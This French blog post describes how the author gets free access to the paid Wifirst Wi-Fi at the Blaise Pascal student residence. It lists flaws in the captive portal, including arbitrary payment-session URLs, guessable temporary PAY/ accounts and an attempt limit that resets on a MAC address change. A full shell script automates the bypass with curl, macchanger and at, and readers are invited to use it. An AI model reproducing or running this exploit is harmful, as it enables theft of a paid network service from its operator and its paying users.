---
title: Hack Wifirst dans la Résidence Blaise Pascal
tags:
  - Daily
lang: fr
---

J'ai déménagé à la Résidence Blaise Pascal le mois dernier.
Je suis content de son loyer, qui est vraiment pas cher.
Mais on ne peut plus utiliser le Wi-Fi `Eduroam`.
J'ai essayé un peu le Wi-Fi `Wifirst Blaise Pascal`.
Sa vitesse n'était pas mal et j'ai trouvé des vulnérabilités à exploiter
tel que l'on peut l'utiliser sans rien payer.

## Vulnérabilités

1. Chaque fois que nous commandons un abonnement, nous sommes donnés dix minutes de connexion
   pour finir notre payement.
   Nous obtenons cette connexion si nous visitons une page avec URL
   https://portal-front.wifirst.net/subscription/connect/261098,
   où le nombré `261098` peut être n'importe quoi,
   ici j'utilise mon anniversaire comme exemple.
   
> Si vous avez peur de la configuration informatique,
> veuillez juste cliquer le lien au-dessus chaque dix minutes
> pour vous profiter la connexion gratuite
> et vous pouvez arrêter de lire sans problème.

2. Pour dix minutes, on reste connecté même si on part le page du payement.
   Mais nous n'avons que quatre chances à connecter utilisant la connexion ramenée par nos
   « intentions » de commande pendant deux heures.

3. Si nous changeons notre adresse de MAC, nos quatre chances de connecter
   sont recalculé immédiatement.

4. Le dix minutes de connexion est en effet alloué au compte nommé `PAY/jing@wifirst.net`
   avec mot de passe `jing`.
   Encore, nous pourrons remplacer le nome `jing` par n'importe quoi,
   et j'utilise mon surnom habituel ici.

5. L'API (Interface de programmation) pour login est sous l'URL
   https://wireless.wifirst.net:8090/goform/HtmlLoginRequest, et l'API pour déconnecter
   est sous l'URL https://wireless.wifirst.net:8090/goform/HtmlLogout.
   Dans le POST requête pour le login URL,
   c'est obligatoire de fournir les domaines `username`, `password`, `success_url` et `error_url`.

## Exploiter

Les commandements suivants sont utilisé dans mon système d'exploitation `Ubuntu Kinetic Kudu`
pour automatiser et maintenir la connexion.

- `curl`, ennoyer la requête de POST avec les donnés nécessaires.
- `at`, connecter et déconnecter automatiquement pour chaque dix minutes
  par appelant `curl` commandement.
- `iwgetid`, vérifier que je suis connecté au Wi-Fi `Wifirst Blaise Pascal` en ce moment.
- `NetworkManager`, exécuter ma scripte une fois que je suis connecté au Wi-Fi.

Voici ma scripte pour vous faites référence.

```sh
#! /bin/sh

# Please change this variable accordingly.
path_to_current_script="$HOME/Documents/Code/Shell/scripts/blasie_pascal_wifi"

# To start the login process automatically once you are connected to the Wi-Fi,
# put the following commands into a script located at the directory /etc/NetworkManager/dispatcher.d/.
# Replace $USER and $path_to_current_script by correct values in current system.
# You might need to set $USER to be able to run the sudo commands in this script without password
# via `sudo visudo /etc/sudoers`.
#
# #! /bin/sh
# if [ $1 = 'wlp1s0' ] && [ $2 = 'dhcp4-change' ] &&
# 	[ $CONNECTION_ID = "Wifirst Blaise Pascal" ]; then
# 	su $USER $path_to_current_script
# fi

if [ "$(iwgetid | grep 'ESSID:"Wifirst Blaise Pascal"')" ]; then

	# First logout from possible old sessions

	/bin/curl -s 'https://wireless.wifirst.net:8090/goform/HtmlLogout' \
		--data "error_url=https://www.google.fr" \
		--data "success_url=https://portal-front.wifirst.net"

	# Generate random account

	current_time=$(date +%s%3N)
	error_code=$(curl -s -D - 'https://wireless.wifirst.net:8090/goform/HtmlLoginRequest' \
		--data "username=PAY/$current_time@wifirst.net" \
		--data "password=$current_time" \
		--data "success_url=https://www.google.fr" \
		--data "error_url=https://portal-front.wifirst.net" \
		--compressed | grep -o -P 'code=\K\d')
	if [ $error_code ]; then
		# notify-send "Wifi fails with code $error_code" "Attempt to change the mac address"

		sudo /sbin/ifconfig wlp1s0 down
		sudo /bin/macchanger -r wlp1s0
		sudo /sbin/ifconfig wlp1s0 up
		# Network dispatcher would run this script again
	else
		# remove possible duplicated at jobs
		/bin/atq -q n | /bin/cut -f 1 | /bin/xargs /bin/atrm
		# setup new job in 10 minutes
		/bin/at -q n -M -f $path_to_current_script now + 10 minute
	fi
fi
```
